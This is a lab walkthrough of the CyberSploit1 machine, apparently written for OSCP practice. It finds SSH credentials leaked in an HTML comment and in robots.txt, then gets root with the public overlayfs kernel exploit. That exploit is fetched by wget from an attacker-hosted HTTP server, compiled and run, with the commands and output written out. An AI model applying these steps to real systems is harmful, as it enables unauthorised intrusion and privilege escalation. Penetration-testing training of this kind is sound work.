---
title : "CyberSploit1- Walkthrough"
date : 21-10-2024 01:30:00
tags : [Offsec-Play, OSCP]
---

## Summary

This machine is exploited by disclosure of a user name and a very obscure password. It is escalated via a local Linux kernel exploit.

## Enumeration

### Nmap

We start off by running an `nmap` scan:

```bash
kali@kali:~$ sudo nmap 192.168.120.216
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 11:36 EDT
Nmap scan report for 192.168.120.216
Host is up (0.036s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Username Disclosure

If we look at the source code of the default web page on port 80 of our target we will see the following commented-out line:

```bash
kali@kali:~$ curl http://192.168.120.216
<!doctype html>
<html lang="en">
...
<!-------------username:itsskv--------------------->
</body>
...
```

This leaks the username `itsskv`.

### Password Disclosure

Running `dirb` with the default wordlist and non-recursive option shows that **robots.txt** is present in the web root:

```bash
kali@kali:~$ dirb http://192.168.120.216 -r
...
---- Scanning URL: http://192.168.120.216/ ----
+ http://192.168.120.216/cgi-bin/ (CODE:403|SIZE:291)
...
+ http://192.168.120.216/robots.txt (CODE:200|SIZE:79)
...
```

Viewing the file, we encounter what looks to be a base64-encoded string:

```bash
kali@kali:~$ curl http://192.168.120.216/robots.txt
Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=
kali@kali:~$
```

We can decode it, revealing the following:

```bash
kali@kali:~$ curl http://192.168.120.216/robots.txt | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    53  100    53    0     0    736      0 --:--:-- --:--:-- --:--:--   736
cybersploit{youtube.com/c/cybersploit}
...
```

## Exploitation

### SSH

Although the decoded string (`cybersploit{youtube.com/c/cybersploit}`) seems quite odd, we can try it as the password to the username we have discovered:

```bash
kali@kali:~$ ssh itsskv@192.168.120.216
...
itsskv@192.168.120.216's password: 
...
itsskv@cybersploit-CTF:~$ id
uid=1001(itsskv) gid=1001(itsskv) groups=1001(itsskv)
itsskv@cybersploit-CTF:~$
```

And we successfully authenticate as the user `itsskv`.

## Escalation

### Local Enumeration

One of the first things to enumerate is the kernel version of the target:

```bash
itsskv@cybersploit-CTF:~$ uname -a
Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
itsskv@cybersploit-CTF:~$
```

Researching this kernel version, we find that this system is vulnerable to `overlayfs` local privilege escalation exploit (https://www.exploit-db.com/exploits/37292):

```bash
kali@kali:~$ searchsploit "3.13.0"
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Loca | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Loca | linux/local/37293.txt
------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### Linux Kernel Exploit

We will host the source code file on our attacking machine using a simple Python HTTP server and download it to the target machine.

```bash
kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.120.216 - - [03/Sep/2020 11:57:51] "GET /37292.c HTTP/1.1" 200 -
...
```

Downloading the exploit to our target machine:

```bash
itsskv@cybersploit-CTF:~$ cd /tmp/
itsskv@cybersploit-CTF:/tmp$ wget http://192.168.118.3/37292.c
--2020-09-03 21:27:52--  http://192.168.118.3/37292.c
Connecting to 192.168.118.3:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3861 (3.8K) [text/plain]
Saving to: `37292.c'

100%[=======================================================================>] 3,861       --.-K/s   in 0s      

2020-09-03 21:27:52 (208 MB/s) - `37292.c' saved [3861/3861]

itsskv@cybersploit-CTF:/tmp$
```

Next, we can compile the source code:

```bash
itsskv@cybersploit-CTF:/tmp$ gcc 37292.c -o 37292
itsskv@cybersploit-CTF:/tmp$
```

Finally, we are able to exploit this kernel version and obtain an elevated shell:

```bash
itsskv@cybersploit-CTF:/tmp$ whoami
itsskv
itsskv@cybersploit-CTF:/tmp$ ./37292
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# python -c 'import pty; pty.spawn("/bin/bash")'
root@cybersploit-CTF:/tmp# 
root@cybersploit-CTF:/tmp# whoami
root
root@cybersploit-CTF:/tmp#
```